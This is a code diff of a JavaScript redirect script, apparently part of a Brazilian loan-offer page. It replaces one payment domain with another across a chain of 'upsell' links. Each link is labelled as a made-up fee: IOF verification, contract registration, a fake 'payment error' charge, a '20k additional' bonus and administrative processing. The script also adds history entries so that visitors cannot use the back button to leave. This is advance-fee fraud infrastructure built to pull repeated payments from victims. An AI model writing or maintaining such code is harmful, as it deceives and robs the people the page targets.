@@ -3,14 +3,14 @@ const baseLinks = {
     up2: "https://go.cinqpay.com.br/67oea0oc55", // Taxa de verificação de IOF
     up3: "https://go.cinqpay.com.br/vtaww5jown", // Seguro Prestamista "tarifa de cadastro"
     up4: "https://go.cinqpay.com.br/rkms5oxjix", // NFe
-    up5: "https://pay.finalizepagamento.store/69541af2795ed29f33a392bb", // Ativar conta
-    up6: "https://pay.finalizepagamento.store/69541b24ede5279f00b13bda", // Taxa de registro do contrato
-    up7: "https://pay.finalizepagamento.store/69541b98a1fcd46a2127c7cb", // Parabéns, 20k adicional
-    up8: "https://pay.finalizepagamento.store/69541bd9a1fcd46a2127c832", // Erro no pagamento - 14,06
-    up9: "https://pay.finalizepagamento.store/69541c25a1fcd46a2127c8b9", // APP - 11,99
-    up10:"https://pay.finalizepagamento.store/69541c5d795ed29f33a39534", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.finalizepagamento.store/69541c99a1fcd46a2127c968", // Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.finalizepagamento.store/69541ccdede5279f00b13f04" // Taxa de Processamento Administrativo - 31,92
+    up5: "https://go.cinqpay.com.br/lsvhuowyhu", // Ativar conta
+    up6: "https://go.cinqpay.com.br/zmtwlqzzzq", // Taxa de registro do contrato
+    up7: "https://go.cinqpay.com.br/0qi93citgh", // Parabéns, 20k adicional
+    up8: "https://go.cinqpay.com.br/yy2czor3up", // Erro no pagamento - 14,06
+    up9: "https://go.cinqpay.com.br/dhfom6ueqe", // APP - 11,99
+    up10:"https://go.cinqpay.com.br/xts35ie8ri", // Taxa de Abertura TAC - 16,92
+    up11:"https://go.cinqpay.com.br/t4ks6djkmt", // Taxa de Consultoria Financeira - 19,53
+    up12:"https://go.cinqpay.com.br/q2s0sj2rc7" // Taxa de Processamento Administrativo - 31,92
 
 };
 
@@ -34,5 +34,6 @@ function redirect(key) {
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
 history.pushState({}, '', location.href);
+
 
 
